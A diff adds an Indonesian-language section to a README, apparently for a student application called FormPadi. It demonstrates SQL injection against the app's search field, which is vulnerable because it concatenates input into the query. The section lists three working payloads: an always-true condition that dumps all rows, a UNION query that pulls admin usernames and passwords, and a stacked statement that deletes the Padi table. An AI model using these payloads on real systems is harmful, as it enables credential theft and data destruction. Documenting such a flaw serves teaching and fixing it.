@@ -1,3 +1,18 @@
+## Skenario Injeksi SQL pada FormPadi
+
+1. **Tampilkan semua data**  
+   Masukkan: `' OR '1'='1`  
+   Query jadi: `SELECT * FROM vw_Padi WHERE namaPetani LIKE '%' OR '1'='1%'`
+
+2. **Ambil data admin (Union)**  
+   Masukkan: `' UNION SELECT idAdmin, username, password, null, null FROM Admin --`
+
+3. **Hapus semua data (jika multi-statement aktif)**  
+   Masukkan: `'; DELETE FROM Padi; --`
+
+> Penyebab: parameter `txtCari.Text` digabung langsung ke query SQL tanpa parameterized query.
+
+
 
 ##Screenshot hasil menjalankan sistem (File ReadMe) : 
 
